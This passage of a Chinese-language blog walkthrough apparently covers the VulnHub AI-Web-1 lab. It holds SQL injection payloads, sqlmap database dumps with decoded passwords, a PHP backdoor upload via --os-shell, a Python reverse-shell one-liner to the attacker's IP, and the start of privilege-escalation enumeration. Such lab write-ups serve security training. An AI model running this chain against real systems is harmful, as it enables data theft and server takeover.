+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 226<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 231<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 231<span class=o>]</span>
+</span></span><span class=line><span class=cl>index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1228<span class=o>]</span>
+</span></span><span class=line><span class=cl>uploads              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 249<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.129/se3reTdir777/uploads/<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>4613</span> / <span class=m>4613</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></td></tr></table></div></div><p>暴露出来一个index.php，于是我们访问一个10.10.10.129/se3reTdir777/index.php 打开是一个表单，尝试抓包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /se3reTdir777/index.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 10.10.10.129
+</span></span><span class=line><span class=cl>Content-Length: 22
+</span></span><span class=line><span class=cl>Cache-Control: max-age=0
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+</span></span><span class=line><span class=cl>Origin: http://10.10.10.129
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class=line><span class=cl>Referer: http://10.10.10.129/se3reTdir777/index.php
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>uid=1&amp;Operation=Submit
+</span></span></code></pre></td></tr></table></div></div><p>发送到重放器，并修改uid 1是admin 2 是 root 3 mysql</p><p>可知uid参数参与了后端查询</p><p>继续尝试并判断有没有sql注入的可能，结果如下</p><p>uid=&rsquo; -> SQL syntax error
+uid=1&rsquo; -> no result
+uid=1&ndash; -> admin
+uid=1# -> admin
+uid=1 OR 1=1 -> admin
+1’ &ndash; - -> admin
+uid= &lsquo;报错具体如下</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &rsquo;&rsquo;&rsquo;&rsquo;&rsquo; at line 1</p><p>然后再尝试 1’ &ndash; - 还是返回admin</p><p>基本可以确认是sql注入了</p><h2 id=sql-注入分析>SQL 注入分析</h2><p>原始 SQL（推测）</p><p>SELECT * FROM users WHERE uid=&rsquo;$uid&rsquo;;</p><p>正常输入：</p><p>uid=1</p><p>SELECT * FROM users WHERE uid=&lsquo;1&rsquo;;</p><p>结果：</p><p>admin</p><hr><p>输入：</p><p>uid='</p><p>SQL 结构被破坏</p><p>MySQL 返回语法错误</p><hr><p>输入：</p><p>uid=1&rsquo; &ndash; -</p><p>SELECT * FROM users WHERE uid=&lsquo;1&rsquo; &ndash; -&rsquo;;</p><p>注释掉后续 SQL</p><p>数据库实际执行：</p><p>SELECT * FROM users WHERE uid=&lsquo;1&rsquo;;</p><p>返回：admin</p><p>由此说明这是一个字符型SQL注入</p><h2 id=sqlmap利用>SQLMap利用</h2><p>将请求头复制并保存</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>POST /se3reTdir777/index.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 10.10.10.129
+</span></span><span class=line><span class=cl>Content-Length: 22
+</span></span><span class=line><span class=cl>Cache-Control: max-age=0
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+</span></span><span class=line><span class=cl>Origin: http://10.10.10.129
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class=line><span class=cl>Referer: http://10.10.10.129/se3reTdir777/index.php
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>uid=1&amp;Operation=Submit
+</span></span></code></pre></td></tr></table></div></div><p>然后打开kail 输入 sqlmap -r 加上刚把请求头保存的路径</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sqlmap identified the following injection point<span class=o>(</span>s<span class=o>)</span> with a total of <span class=m>3897</span> HTTP<span class=o>(</span>s<span class=o>)</span> requests:
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl>Parameter: uid <span class=o>(</span>POST<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Type: boolean-based blind
+</span></span><span class=line><span class=cl>    Title: OR boolean-based blind - WHERE or HAVING clause <span class=o>(</span>NOT - MySQL comment<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: <span class=nv>uid</span><span class=o>=</span>1<span class=s1>&#39; OR NOT 9203=9203#&amp;Operation=Submit
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>    Type: error-based
+</span></span></span><span class=line><span class=cl><span class=s1>    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+</span></span></span><span class=line><span class=cl><span class=s1>    Payload: uid=1&#39;</span> AND EXTRACTVALUE<span class=o>(</span>4923,CONCAT<span class=o>(</span>0x5c,0x717a7a7a71,<span class=o>(</span>SELECT <span class=o>(</span>ELT<span class=o>(</span><span class=nv>4923</span><span class=o>=</span>4923,1<span class=o>)))</span>,0x716a626b71<span class=o>))</span>-- Pagv<span class=p>&amp;</span><span class=nv>Operation</span><span class=o>=</span>Submit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: time-based blind
+</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: <span class=nv>uid</span><span class=o>=</span>1<span class=s1>&#39; AND (SELECT 7969 FROM (SELECT(SLEEP(5)))UATH)-- aAdq&amp;Operation=Submit
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>    Type: UNION query
+</span></span></span><span class=line><span class=cl><span class=s1>    Title: MySQL UNION query (NULL) - 3 columns
+</span></span></span><span class=line><span class=cl><span class=s1>    Payload: uid=1&#39;</span> UNION ALL SELECT CONCAT<span class=o>(</span>0x717a7a7a71,0x45525268796c6a6f5a47576d7768764d4f4a65765462584d5a6c4d7043714c594a426b71426b7274,0x716a626b71<span class=o>)</span>,NULL,NULL#<span class=p>&amp;</span><span class=nv>Operation</span><span class=o>=</span>Submit
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl><span class=o>[</span>12:53:03<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
+</span></span><span class=line><span class=cl>web application technology: Apache
+</span></span><span class=line><span class=cl>back-end DBMS: MySQL &gt;<span class=o>=</span> 5.1
+</span></span><span class=line><span class=cl><span class=o>[</span>12:53:03<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetched data logged to text files under <span class=s1>&#39;/home/kali/.local/share/sqlmap/output/10.10.10.129&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 12:53:03 /2026-07-10/
+</span></span></code></pre></td></tr></table></div></div><p>这次SQL注入类型</p><ul><li>“boolean blind”（布尔盲注）</li><li>“error based”（报错注入）</li><li>“time based”（时间盲注）</li><li>“UNION query”（联合查询注入）</li></ul><h2 id=数据库脱库>数据库脱库</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Database: aiweb1                                                                                                
+</span></span><span class=line><span class=cl>Table: systemUser                                                                                                            
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>3</span> entries<span class=o>]</span>                                                                                                                    
+</span></span><span class=line><span class=cl>+----+----------------------------------------------+-----------+                                                                                                                                                 
+</span></span><span class=line><span class=cl><span class=p>|</span> id <span class=p>|</span> password                                     <span class=p>|</span> userName  <span class=p>|</span>                                                                                                                                                 
+</span></span><span class=line><span class=cl>+----+----------------------------------------------+-----------+                                                                                                                                                 
+</span></span><span class=line><span class=cl><span class=p>|</span> <span class=m>1</span>  <span class=p>|</span> <span class=nv>RmFrZVVzZXJQYXNzdzByZA</span><span class=o>==</span>                     <span class=p>|</span> t00r      <span class=p>|</span>                                                                                                                                                 
+</span></span><span class=line><span class=cl><span class=p>|</span> <span class=m>2</span>  <span class=p>|</span> <span class=nv>TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ</span><span class=o>==</span> <span class=p>|</span> aiweb1pwn <span class=p>|</span>                                                                                                                                                 
+</span></span><span class=line><span class=cl><span class=p>|</span> <span class=m>3</span>  <span class=p>|</span> <span class=nv>TjB0VGhpczBuZUFsczA</span><span class=o>=</span>                         <span class=p>|</span> u3er      <span class=p>|</span>                                               
+</span></span><span class=line><span class=cl>+----+----------------------------------------------+-----------+           
+</span></span></code></pre></td></tr></table></div></div><p>判断均为base64
+FakeUserPassword
+MyEvilPass_f908sdaf9_sadfasf0sa
+N0tThis0neAls0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Database: aiweb1                                                                                                                                                                                                  
+</span></span><span class=line><span class=cl>Table: user                                                                                                                                                                                                       
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>3</span> entries<span class=o>]</span>                                                                                                                                                                                                       
+</span></span><span class=line><span class=cl>+-----------+----+----------+                                                       
+</span></span><span class=line><span class=cl><span class=p>|</span> firstName <span class=p>|</span> id <span class=p>|</span> lastName <span class=p>|</span>                                                                                                      
+</span></span><span class=line><span class=cl>+-----------+----+----------+                                                                                                     
+</span></span><span class=line><span class=cl><span class=p>|</span> admin     <span class=p>|</span> <span class=m>1</span>  <span class=p>|</span> admin    <span class=p>|</span>                              
+</span></span><span class=line><span class=cl><span class=p>|</span> root      <span class=p>|</span> <span class=m>2</span>  <span class=p>|</span> root     <span class=p>|</span>                                               <span class=p>|</span> mysql     <span class=p>|</span> <span class=m>3</span>  <span class=p>|</span> mysql    <span class=p>|</span>                                                  
+</span></span><span class=line><span class=cl>+-----------+----+----------+                                               
+</span></span></code></pre></td></tr></table></div></div><h2 id=数据库信息收集>数据库信息收集</h2><p>疑似后台用户表 但未发现登录入口 继续寻找利用点</p><p>曾经获取的绝对路径+上传路径这个信息这两个敏感信息还没利用，验证是否有写入文件并上传的可能</p><p>执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AIWeb1/requests<span class=o>]</span>                            └─$ sqlmap -r requestaiweb1.txt --current-user --is-dba --privileges 
+</span></span></code></pre></td></tr></table></div></div><p>得到</p><p>current user: &lsquo;aiweb1user@localhost&rsquo;
+current user is DBA: False
+privilege: FILE</p><p>解读</p><div class=table-wrapper><table><thead><tr><th>检查项</th><th>结果</th><th>含义</th></tr></thead><tbody><tr><td>当前用户</td><td>aiweb1user@localhost</td><td>一个普通用户</td></tr><tr><td>是否是 DBA</td><td>False</td><td>不是数据库管理员无法直接通过 <code>UDF</code> 提权（这是一种数据库提权方式），但这<strong>完全不影响</strong>我们写 Webshell。</td></tr><tr><td>FILE 权限</td><td>FILE</td><td>这是最重要的信息！ FILE 权限允许数据库用户使用 INTO OUTFILE 和 LOAD_FILE 函数，即读取和写入服务器文件系统。</td></tr></tbody></table></div><h2 id=获取webshell>获取WebShell</h2><p>于是执行 sqlmap -r requestaiweb1.txt &ndash;os&ndash;shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=n>ASP</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=n>ASPX</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=n>CFM</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=n>JSP</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=n>PHP</span> <span class=p>(</span><span class=n>default</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=mi>5</span>
+</span></span><span class=line><span class=cl><span class=k>do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>sqlmap</span> <span class=n>to</span> <span class=n>further</span> <span class=n>try</span> <span class=n>to</span> <span class=n>provoke</span> <span class=n>the</span> <span class=n>full</span> <span class=n>path</span> <span class=n>disclosure</span><span class=err>?</span> <span class=p>[</span><span class=n>Y</span><span class=o>/</span><span class=n>n</span><span class=p>]</span> <span class=n>y</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>14</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>07</span><span class=p>]</span> <span class=p>[</span><span class=n>WARNING</span><span class=p>]</span> <span class=n>unable</span> <span class=n>to</span> <span class=n>automatically</span> <span class=n>retrieve</span> <span class=n>the</span> <span class=n>web</span> <span class=n>server</span> <span class=n>document</span> <span class=n>root</span>
+</span></span><span class=line><span class=cl><span class=n>what</span> <span class=k>do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>use</span> <span class=k>for</span> <span class=n>writable</span> <span class=n>directory</span><span class=err>?</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=n>common</span> <span class=n>location</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=p>(</span><span class=s1>&#39;/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www, /usr/share/nginx/html&#39;</span><span class=p>)</span> <span class=p>(</span><span class=n>default</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=n>custom</span> <span class=n>location</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=n>custom</span> <span class=n>directory</span> <span class=n>list</span> <span class=n>file</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=n>brute</span> <span class=n>force</span> <span class=n>search</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=n>please</span> <span class=n>provide</span> <span class=n>a</span> <span class=n>comma</span> <span class=n>separate</span> <span class=n>list</span> <span class=n>of</span> <span class=n>absolute</span> <span class=n>directory</span> <span class=n>paths</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>web1x443290o2sdf92213</span><span class=o>/</span><span class=n>se3reTdir777</span><span class=o>/</span><span class=n>uploads</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>14</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>26</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>retrieved</span> <span class=n>web</span> <span class=n>server</span> <span class=n>absolute</span> <span class=n>paths</span><span class=p>:</span> <span class=s1>&#39;/se3reTdir777/index~.php&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>14</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>26</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>trying</span> <span class=n>to</span> <span class=n>upload</span> <span class=n>the</span> <span class=n>file</span> <span class=n>stager</span> <span class=n>on</span> <span class=s1>&#39;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/&#39;</span> <span class=n>via</span> <span class=n>LIMIT</span> <span class=s1>&#39;LINES TERMINATED BY&#39;</span> <span class=n>method</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>14</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>26</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>the</span> <span class=n>file</span> <span class=n>stager</span> <span class=n>has</span> <span class=n>been</span> <span class=n>successfully</span> <span class=n>uploaded</span> <span class=n>on</span> <span class=s1>&#39;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/&#39;</span> <span class=o>-</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.129</span><span class=p>:</span><span class=mi>80</span><span class=o>/</span><span class=n>se3reTdir777</span><span class=o>/</span><span class=n>uploads</span><span class=o>/</span><span class=n>tmputwvt</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>14</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>26</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>the</span> <span class=n>backdoor</span> <span class=n>has</span> <span class=n>been</span> <span class=n>successfully</span> <span class=n>uploaded</span> <span class=n>on</span> <span class=s1>&#39;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/&#39;</span> <span class=o>-</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.129</span><span class=p>:</span><span class=mi>80</span><span class=o>/</span><span class=n>se3reTdir777</span><span class=o>/</span><span class=n>uploads</span><span class=o>/</span><span class=n>tmpbzgxj</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>14</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>26</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>calling</span> <span class=ne>OS</span> <span class=n>shell</span><span class=o>.</span> <span class=n>To</span> <span class=n>quit</span> <span class=n>type</span> <span class=s1>&#39;x&#39;</span> <span class=ow>or</span> <span class=s1>&#39;q&#39;</span> <span class=ow>and</span> <span class=n>press</span> <span class=n>ENTER</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>-</span><span class=n>shell</span><span class=o>&gt;</span> <span class=n>whoami</span>
+</span></span><span class=line><span class=cl><span class=k>do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>retrieve</span> <span class=n>the</span> <span class=n>command</span> <span class=n>standard</span> <span class=n>output</span><span class=err>?</span> <span class=p>[</span><span class=n>Y</span><span class=o>/</span><span class=n>n</span><span class=o>/</span><span class=n>a</span><span class=p>]</span> <span class=n>y</span>
+</span></span><span class=line><span class=cl><span class=n>command</span> <span class=n>standard</span> <span class=n>output</span><span class=p>:</span> <span class=s1>&#39;www-data&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>-</span><span class=n>shell</span><span class=o>&gt;</span> <span class=n>id</span>
+</span></span><span class=line><span class=cl><span class=k>do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>retrieve</span> <span class=n>the</span> <span class=n>command</span> <span class=n>standard</span> <span class=n>output</span><span class=err>?</span> <span class=p>[</span><span class=n>Y</span><span class=o>/</span><span class=n>n</span><span class=o>/</span><span class=n>a</span><span class=p>]</span> <span class=n>y</span>
+</span></span><span class=line><span class=cl><span class=n>command</span> <span class=n>standard</span> <span class=n>output</span><span class=p>:</span> <span class=s1>&#39;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>-</span><span class=n>shell</span><span class=o>&gt;</span> 
+</span></span></code></pre></td></tr></table></div></div><h2 id=反弹shell>反弹Shell</h2><p>开一个新窗口用于监听</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
+</span></span></code></pre></td></tr></table></div></div><p>os-shell> 中输入
+python3 -c &lsquo;import socket,os,pty;s=socket.socket();s.connect((&ldquo;10.10.10.10&rdquo;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")&rsquo;</p><p>10.10.10.10 是我的kali ip</p><p>于是监听到了</p><h2 id=权限提升>权限提升</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ whoami
+</span></span><span class=line><span class=cl>&lt;/web1x443290o2sdf92213/se3reTdir777/uploads$ whoami                       
+</span></span><span class=line><span class=cl>www-data
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ id
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>&lt;tml/web1x443290o2sdf92213/se3reTdir777/uploads$ <span class=nb>pwd</span>                       
+</span></span><span class=line><span class=cl>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>tmpbzgxj.php  tmputwvt.php
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ uname -a
+</span></span><span class=line><span class=cl>&lt;eb1x443290o2sdf92213/se3reTdir777/uploads$ uname -a                       
+</span></span><span class=line><span class=cl>Linux aiweb1 4.15.0-58-generic <span class=c1>#64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ cat /etc/issue
+</span></span><span class=line><span class=cl>&lt;3290o2sdf92213/se3reTdir777/uploads$ cat /etc/issue                       
+</span></span><span class=line><span class=cl>Ubuntu 18.04.3 LTS <span class=se>\n</span> <span class=se>\l</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ cat /etc/passwd
